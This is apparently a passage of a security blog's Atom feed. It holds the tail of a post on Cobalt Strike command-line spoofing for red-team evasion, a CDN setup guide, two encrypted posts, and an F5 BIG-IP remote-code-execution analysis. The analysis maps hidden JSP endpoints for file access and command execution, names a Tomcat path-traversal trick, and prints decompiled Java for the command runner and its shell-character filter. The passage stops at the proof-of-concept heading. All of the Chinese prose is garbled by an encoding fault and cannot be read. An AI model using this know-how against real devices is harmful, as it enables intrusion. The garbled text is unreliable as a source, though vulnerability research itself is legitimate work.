title="ÊÄùËÄÉ"></a>ÊÄùËÄÉ</h2><p>ÂêåËøôÁØáÊñáÁ´†‰∏ÄËµ∑ÁöÑËøòÊúâ<a href="https://blog.nviso.eu/2020/01/31/the-return-of-the-spoof-part-1-parent-process-id-spoofing/" target="_blank" rel="noopener">Áà∂ËøõÁ®ãIDÊ¨∫È™ó</a>ÔºåËøô‰∏§‰∏™ÊâãÊÆµÁªìÂêà‰∏ÄËµ∑ÁîüÊàê‰∏Ä‰∏™ÊòìÁî® exe Â∫îËØ•ÊòØÂæàÊúâÊïàÁöÑÁ∫¢ÈòüÊâãÊÆµÔºåÊØîÂ¶ÇÈöèÊú∫ÁîüÊàê‰º™Ë£ÖÂëΩ‰ª§„ÄÅËá™Âä®‰º™Ë£ÖÔºåËøôÊ†∑Âú®Êù•‰∏çÂèäÊ∏ÖÁêÜÂéÜÂè≤ËÆ∞ÂΩïÁöÑÊÉÖÂÜµ‰∏ã‰πüËÉΩÂª∂ÁºìËìùÈòüÁöÑÊ≠•‰ºê‚Ä¶</p><p>‰ΩÜÊòØÂ•à‰Ωï‰∏ç‰ºö c++ÔºåÂÖàÁïô‰∏™Âùë</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/" target="_blank" rel="noopener">How to Argue like Cobalt Strike</a></li><li><a href="https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/" target="_blank" rel="noopener">The return of the spoof part 2: Command line spoofing</a></li><li><a href="youtube.com/watch?v=l8nkXCOYQC4">Red Teaming in the EDR age</a></li><li><a href="http://journal.seu.edu.cn/oa/pdfdow.aspx?Sid=201301005" target="_blank" rel="noopener">Âü∫‰∫éÁõ¥Êé•ÂÜÖÊ†∏ÂØπË±°Êìç‰ΩúÁöÑËøõÁ®ã‰º™Ë£Ö‰øùÊä§ÊñπÊ≥ï</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Á™ÅÁÑ∂Â•ΩÂ•á argue ÂéüÁêÜÔºå‰∫éÊòØÊúâ‰∫ÜÊ≠§Êñá&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>Github Page Âä†ÈÄü</title>
    <link href="https://blog.sari3l.com/posts/afd91327/"/>
    <id>https://blog.sari3l.com/posts/afd91327/</id>
    <published>2020-08-01T16:54:48.000Z</published>
    <updated>2020-08-05T11:24:19.935Z</updated>
    
    <content type="html"><![CDATA[<p>‰ªäÂ§©ÂÆûÂú®Ë¢´ github page ÁöÑÂä†ËΩΩÈÄüÂ∫¶ÊÅ∂ÂøÉÂà∞‰∫ÜÔºåÊµãËØï‰∫ÜÂá†‰∏™CDNÊïàÊûúÔºåËôΩÁÑ∂ÊúâÂÖçË¥πÊµÅÈáèÁ≠âÊ¥ªÂä®ÔºåÊÄªÊÑüËßâË¢´Êî∂Ââ≤‰∫Ü‰ªÄ‰πà</p><p>‰∏≠Èó¥ÊµãËØï‰∫Ü netlifyÔºåÂºÄÂßãÂØπÂÆÉÈÄüÂ∫¶‰∏çÊòØÂæàÊª°ÊÑèÔºå‰ΩÜ‰πãÂêéÊµãËØï‰∫ÜÂá†‰∏™ËøòÊòØÂõûÂà∞‰∫ÜÂÆÉÔºåOrz</p><p>ÊúÄÁªàÈÖçÂêàÂà©Áî®ÂêÑÁßçÊâãÊÆµËøòÁÆóÊòØËææÂà∞‰∫ÜÊî∂Ë¥π CDN ÁöÑÊïàÊûú(ÊúâÈ°πÁõÆ‰ΩìÈáèÈôêÂà∂)ü§£</p><p><strong>Âª∫ËÆÆjsdelivrÂè™ÂÅö JS„ÄÅCSS Âä†ÈÄüÂ∞±Â•ΩÔºåÊØïÁ´üÂ•ΩÁî®ÁöÑÂÖ¨ÂÖ±Â∫ìÁî®‰∏Ä‰∏™Â∞ë‰∏Ä‰∏™</strong></p><ol><li>netlify - ËµÑÊ∫êÊâòÁÆ°„ÄÅcdn Âä†ÈÄü</li><li>cloudflare - cdn Âä†ÈÄü</li><li>lazyload - ÂõæÁâáÂºÇÊ≠•Âª∂ËøüÂä†ËΩΩ</li><li>jsdelivr - ÈùôÊÄÅËµÑÊ∫êÂä†ÈÄü</li></ol><h2 id="1-Netlify"><a href="#1-Netlify" class="headerlink" title="1. Netlify"></a>1. Netlify</h2><ol><li><p>ÈÄâÊã©ËÆøÈóÆ github ‰ªìÂ∫ì</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962888273340.jpg" alt="-w1241"></p></li><li><p>ÈÄâÊã© github page È°πÁõÆ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962967632283.jpg" alt="-w1246"></p></li><li><p>Âõ†‰∏∫‰∏ä‰º†Ëá≥github page‰∏∫ÈùôÊÄÅÈ°µÈù¢‰∏çÈúÄË¶ÅÁºñËØëÔºåËøôÈáåÈÄâÊã©Áõ¥Êé•ÈÉ®ÁΩ≤Âç≥ÂèØ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962968325497.jpg" alt="-w1238"></p></li><li><p>ÈÖçÁΩÆ netlify ÂüüÂêçËß£Êûê</p><p> ËøôÈáåÊ≠£Â∏∏ÊÉÖÂÜµ primary domain Â∫î‰∏∫ÁªøËâ≤Ë°®Á§∫<code>Ê≠£Â∏∏Áä∂ÊÄÅ</code>Ôºå‰ΩÜÁî±‰∫éÂºÄÂêØ‰∫Ü cloudflare cdn ÂØºËá¥ DNS Ê£ÄÊµãÂºÇÂ∏∏ÔºåÊ£ÄÊµãËÉΩÊ≠£Â∏∏ËÆøÈóÆÂøΩÁï•Ê≠§Ë≠¶Âëä</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962974152636.jpg" alt="-w1222"></p></li><li><p>ÈÖçÁΩÆSSL/TLSËØÅ‰π¶</p><p> Áî±‰∫éÊàëÂú® Netlify ÂâçÈù¢‰ΩøÁî® CloudFlare CDNÔºåÊâÄ‰ª•ÈúÄË¶ÅÈÖçÂêà CF ËøõË°åËØÅ‰π¶ËÆ§ËØÅÔºåÈùû CF ÂèØ‰ª•Â∞ùËØïÂè≥ËæπÁöÑ<code>Let&#39;s Encrypt</code>ËØÅ‰π¶ÔºàËøôÈáåÊàëÂ∑≤ÁªèÊ∑ªÂä†‰∫ÜËØÅ‰π¶ÔºåÊâÄ‰ª•ÈÄâÊã©Êõ¥Êñ∞Ëá™ÂÆö‰πâÂÜÖÂÆπËØÅ‰π¶Ôºâ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962977185708.jpg" alt="-w957"></p><p> i. ÂÖàÂú® CF ÂàõÂª∫<code>Ê∫êËØÅ‰π¶</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962979813348.jpg" alt="-w1086"></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962980996211.jpg" alt="-w825"></p><p> ii. ‰πãÂêéÁîüÊàê PEM Ê†ºÂºèÂØÜÈí•ÔºåËÆ∞ÂΩïÊ∫êËØÅ‰π¶‰∏∫ 1ÔºåÁßÅÈí•‰∏∫ 2</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962981679521.jpg" alt="-w819"></p><p> iii. ËÆøÈóÆ<a href="https://support.cloudflare.com/hc/zh-cn/articles/115000479507" target="_blank" rel="noopener">Ê≠§È°µÈù¢(ÁÆ°ÁêÜ Cloudflare Origin CA ËØÅ‰π¶)</a>ÔºåËÆ∞ÂΩïÊ†πËØÅ‰π¶‰∏∫ 3</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962983204747.jpg" alt="-w894"></p><p> iv. ÂõûÂà∞ NetlifyÔºåÊåâ‰∏äÈù¢ÂØπÂ∫îÂ∫èÂè∑Â°´ÂÜôËØÅ‰π¶ÂÜÖÂÆπÂêé‰øùÂ≠ò</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962977767693.jpg" alt="-w638"></p></li></ol><h2 id="2-CloudFlare"><a href="#2-CloudFlare" class="headerlink" title="2. CloudFlare"></a>2. CloudFlare</h2><ol><li><p>ÈÖçÁΩÆ CNAME ÊåáÂêë Netlify Ëá™ÂÆö‰πâÂüüÂêçÔºåÂπ∂ÂºÄÂêØ CDN Âä†ÈÄü</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962987471338.jpg" alt="-w1038"></p></li><li><p>ÈÄâÊã©Âä†ÂØÜÊ®°Âºè‰∏∫<code>ÂÆåÂÖ®</code>Êàñ<code>ÂÆåÂÖ®Ôºà‰∏•Ê†ºÔºâ</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962988163771.jpg" alt="-w1065"></p></li><li><p>ÂºÄÂêØ<code>Always HTTPS</code>Âíå <code>HSTS</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962988791773.jpg" alt="-w1047"></p></li></ol><h2 id="3-lazy-load"><a href="#3-lazy-load" class="headerlink" title="3. lazy load"></a>3. lazy load</h2><p>È°πÁõÆÂú∞ÂùÄÔºö<a href="https://github.com/Troy-Yang/hexo-lazyload-image" target="_blank" rel="noopener">https://github.com/Troy-Yang/hexo-lazyload-image</a></p><p>ÊåâÊñáÊ°£ÂÆâË£Ö„ÄÅÈÖçÁΩÆÂç≥ÂèØ</p><pre class=" language-shell"><code class="language-shell">$ npm install hexo-lazyload-image --save</code></pre><h2 id="4-jsdelivr"><a href="#4-jsdelivr" class="headerlink" title="4. jsdelivr"></a>4. jsdelivr</h2><p><strong>Áî±‰∫éjsdelivrËá™Â∏¶ 50M È°πÁõÆÈôêÂà∂ÔºåÊâÄ‰ª•ÂÖ®Â±ÄÂä†ÈÄüÊòØ‰∏çÁé∞ÂÆûÁöÑÔºàÊ≠§Â§ÑÈ°πÁõÆËæÉÂ∞èÁöÑÂèØ‰ª•ÂÖ®Â±Ä‰ΩøÁî®ÔºâÔºåÂª∫ËÆÆÂè™Âä†ÈÄü JS„ÄÅCSS Âç≥ÂèØÔºå‰∏ãÈù¢Âè™ÂÅöÁêÜËÆ∫‰ªãÁªç</strong></p><p>ÂÆòÁΩëÔºö<a href="https://www.jsdelivr.com/?docs=gh" target="_blank" rel="noopener">https://www.jsdelivr.com/?docs=gh</a></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962991108849.jpg" alt="-w1171"></p><ol><li><p>Áî±‰∫éÊàëÈÖçÁΩÆ‰∫Ü hexo-lazyload-imageÔºåÊâÄ‰ª•Áõ¥Êé•Á≤óÊö¥ÁöÑ‰øÆÊîπÊ∫êÁ†ÅÔºàËøôÈáåÂè™ÂØπÂ∫î posts ÊñáÁ´†ÂÜÖÁöÑÈùôÊÄÅËµÑÊ∫êÔºâÔºå‰ª£‰ª∑Â∞±ÊòØÊú¨Âú∞ÊµãËØïÊ≤°Ê≥ïÂä†ËΩΩÂõæÁâáÔºåÊúâËÉΩÂäõÁöÑÂèØ‰ª•ÂÜô‰∏™ÊµãËØïÂíåÂèëÂ∏ÉÂàÜÂà´Âä†ËΩΩ‰∏çÂêåÂú∞ÂùÄÂç≥ÂèØ</p><p> ‰ΩçÁΩÆÔºö<code>&lt;blog_path&gt;/node_modules/hexo-asset-image/index.js</code></p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962992328798.jpg" alt="-w1087"></p></li><li><p>ÂØπÂ∫îÂÖ∂‰ªñÈùôÊÄÅÊñá‰ª∂ÔºåÂ¶ÇÂ§¥ÂÉè„ÄÅ‰∫åÁª¥Á†ÅÁ≠âÔºåÁõ¥Êé•‰øÆÊîπÊàêÁªùÂØπÂú∞ÂùÄÂç≥ÂèØÔºà‰∏çÂà©‰∫éÈïøÊúüÁª¥Êä§Ôºâ</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/afd91327/15962997100660.jpg" alt="-w692"></p></li></ol><p>P.S. ÂÖ∂ÂÆûÂèØ‰ª•Ëá™ÂÆö‰πâÂú® config ‰∏≠Ëá™ÂÆö‰πâ‰∏Ä‰∏™ÂºÄÂÖ≥ÂíåÂä†ËΩΩË∑ØÂæÑÊñπ‰æøÊú™Êù•Áª¥Êä§ÔºåËøôÈáåÊúâÊèí‰ª∂<a href="https://www.npmjs.com/package/hexo-cdn-jsdelivr" target="_blank" rel="noopener">hexo-cdn-jsdelivr</a>ÂÆûÁé∞ÔºåÊú¨Âú∞ÊµãËØïÊ≤°ÊúâÈóÆÈ¢ò‰ΩÜÊòØgenerateÊó∂ÊÄª‰ºöÂá∫ÈîôÔºåÂèØËÉΩÂíåÂÖ∂‰ªñÊèí‰ª∂ÊúâÂÜ≤Á™ÅÔºåÊàëÊöÇÊó∂Ê≤°ÊúâÂéª‰ªîÁªÜÁ†îÁ©∂</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w" target="_blank" rel="noopener">https://blog.ops-coffee.cn/s/11-yhyohtdsbl9ffnvcs6w</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Âø´Âø´Âø´ÔºåÂÜ≤ÂÜ≤ÂÜ≤~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Á†¥Ëß£Ê≠•È™§</title>
    <link href="https://blog.sari3l.com/posts/76ce816c/"/>
    <id>https://blog.sari3l.com/posts/76ce816c/</id>
    <published>2020-07-31T02:51:55.000Z</published>
    <updated>2020-08-04T09:29:03.116Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="74bf7c74f19487e94d2590775d226ded1355b2ff5113380d34592df650af83b0"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Pentest" scheme="https://blog.sari3l.com/categories/Pentest/"/>
    
    
      <category term="cobaltstirke" scheme="https://blog.sari3l.com/tags/cobaltstirke/"/>
    
  </entry>
  
  <entry>
    <title>‰∏ÄÈÅìÈ¢òÂõûÈ°æÊô∫ËÉΩÂêàÁ∫¶ Coverage</title>
    <link href="https://blog.sari3l.com/posts/b7ea5c49/"/>
    <id>https://blog.sari3l.com/posts/b7ea5c49/</id>
    <published>2020-07-13T08:32:42.000Z</published>
    <updated>2020-07-13T08:35:07.429Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cd56c455c979df0526c2908038fd59da4ffd1ebfcbf9e79bda8b9308b75cbe0f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Pentest" scheme="https://blog.sari3l.com/categories/Pentest/"/>
    
    
      <category term="Êô∫ËÉΩÂêàÁ∫¶" scheme="https://blog.sari3l.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>F5 BIG-IP RCEÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/58a67794/"/>
    <id>https://blog.sari3l.com/posts/58a67794/</id>
    <published>2020-07-06T02:45:39.000Z</published>
    <updated>2020-07-08T07:00:40.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>‰ªéÈÄöÂëä‰∏≠ÂèØ‰ª•ÊòéÁ°ÆÂá†‰∏™ÁÇπ</p><ol><li>‰Ωç‰∫é tmui</li><li><code>..;</code>Ë∑ØÂæÑÁ©øÈÄè -&gt; Apache Tomcat</li><li>ÈöêËóèÈ°µÈù¢</li></ol><p>ËôöÊãüÊú∫‰∏≠ÊèêÂèñÊ∫êÁ†ÅÂπ∂ÁÆÄÂçïÂàÜÊûêÂêéÂèØ‰ª•Á°ÆÂÆöjspÂØπÂ∫îclass‰Ωç‰∫é</p><pre class=" language-shell"><code class="language-shell"># Áõ∏ÂØπË∑ØÂæÑ/www/tmui/WEB-INF/classes/org/apache/jsp/tmui# ÁªùÂØπË∑ØÂæÑ/usr/local/www/tmui/WEB-INF/classes/org/apache/jsp/tmui</code></pre><p>ÊúÄÂêéÂú® locallb/workspace ‰∏≠ÂèØ‰ª•ÁúãÂà∞Êúâ‰ª•‰∏ãÂá†‰∏™ÂÖ≥ÈîÆÁ±ª</p><table><thead><tr><th>class</th><th>jsp path</th><th>feature</th><th>parameter</th></tr></thead><tbody><tr><td>create_jsp.class</td><td>/tmui/locallb/workspace/list.jsp</td><td>ÂàõÂª∫ jsp Êñá‰ª∂</td><td></td></tr><tr><td>dbquery_jsp.class</td><td>/tmui/locallb/workspace/dbquery.jsp</td><td>Êü•ËØ¢Êï∞ÊçÆÂ∫ì</td><td>query<br>object<br>column</td></tr><tr><td>directoryList_jsp.class</td><td>/tmui/locallb/workspace/directoryList.jsp</td><td>ÂàóÁõÆÂΩï</td><td>directoryPath</td></tr><tr><td>fileRead_jsp.class</td><td>/tmui/locallb/workspace/fileRead.jsp</td><td>ËØªÊñá‰ª∂</td><td>fileName</td></tr><tr><td>fileSave_jsp.class</td><td>/tmui/locallb/workspace/fileSave.jsp</td><td>ÂÜôÊñá‰ª∂</td><td>fileName<br>content</td></tr><tr><td>import_jsp.class</td><td>/tmui/locallb/workspace/import.jsp</td><td>Âä†ËΩΩ jsp Êñá‰ª∂</td><td></td></tr><tr><td>list_jsp.lass</td><td>/tmui/locallb/workspace/list.jsp</td><td>ÂàóÊï∞ÊçÆÂ∫ì‰ø°ÊÅØ</td><td></td></tr><tr><td>properties_jsp.class</td><td>/tmui/locallb/workspace/properties.jsp</td><td>ÂèÇÊï∞ËÆæÂÆö</td><td>pageType<br>properties</td></tr><tr><td>settings_jsp.class</td><td>/tmui/locallb/workspace/settings.jsp</td><td>Âàó‰∏æÂèÇÊï∞‰ø°ÊÅØ</td><td></td></tr><tr><td>tmshCmd_jsp.class</td><td>/tmui/locallb/workspace/tmshCmd.jsp</td><td>ÂëΩ‰ª§ÊâßË°å</td><td>command</td></tr></tbody></table><p>ÂØπÂ∫î<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils</code>‰∏≠ÁöÑÊñπÊ≥ïÂÆûÁé∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/58a67794/15940163972331.jpg" alt></p><p>Âú®ÊµèËßàÂô®‰∏≠Áõ¥Êé•ËÆøÈóÆÂä†ËΩΩËøô‰∫õÈ°µÈù¢‰ºöË¢´ÈáçÂÆöÂêëÔºå‰ΩÜÈÄöËøá tomcat Ë∑ØÂæÑÁ©øÈÄèÂèØ‰ª•ÊéßÂà∂Âú® tmui ‰∏ãËøõË°åÂä†ËΩΩ</p><p>ÁÑ∂ÂêéËøôÈáåËØ¥‰∏ã tmshCmd ÊâßË°åÁöÑÈóÆÈ¢ò</p><p>Âú®<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand</code>‰∏≠ÊâßË°å‰º†ÂÖ•ÁöÑ commandÔºå‰ΩÜÈôêÂà∂ÂèØÁî®ÁöÑÊìç‰Ωú‰∏∫<code>create</code>„ÄÅ<code>delete</code>„ÄÅ<code>list</code>„ÄÅ<code>modify</code>ÂõõÁßçÊ®°ÂùóÔºå‰∏îÁî±‰∫é<code>checkForBadShellCharacters</code>ËøõË°å‰∫ÜËøáÊª§ÔºåÈúÄË¶ÅÊâæÂà∞ÊñπÊ≥ïË∑≥Âá∫ÈôêÂà∂ÈÄöËøá<a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/run.html" target="_blank" rel="noopener"><code>run</code>Ê®°Âùó</a>ÊâßË°å bash ÂëΩ‰ª§</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> JSONObject <span class="token function">runTmshCommand</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token punctuation">{</span>    F5Logger logger <span class="token operator">=</span> <span class="token punctuation">(</span>F5Logger<span class="token punctuation">)</span>F5Logger<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>WorkspaceUtils<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    JSONObject resultObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String error <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String operation <span class="token operator">=</span> command<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ShellCommandValidator<span class="token punctuation">.</span><span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"create"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"delete"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"modify"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        error <span class="token operator">=</span> NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.RejectedTmshCommand"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>            Result result <span class="token operator">=</span> Syscall<span class="token punctuation">.</span><span class="token function">callElevated</span><span class="token punctuation">(</span>Syscall<span class="token punctuation">.</span>TMSH<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>            output <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CallException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.TmshCommandFailed"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultObject<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ËøáÊª§ÂáΩÊï∞<code>com.f5.form.ShellCommandValidator#checkForBadShellCharacters</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cArray <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> cArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">';'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'`'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\''</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'"'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'|'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'?'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'~'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'&lt;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'>'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'^'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'['</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">']'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'{'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'}'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>RCEÔºö <a 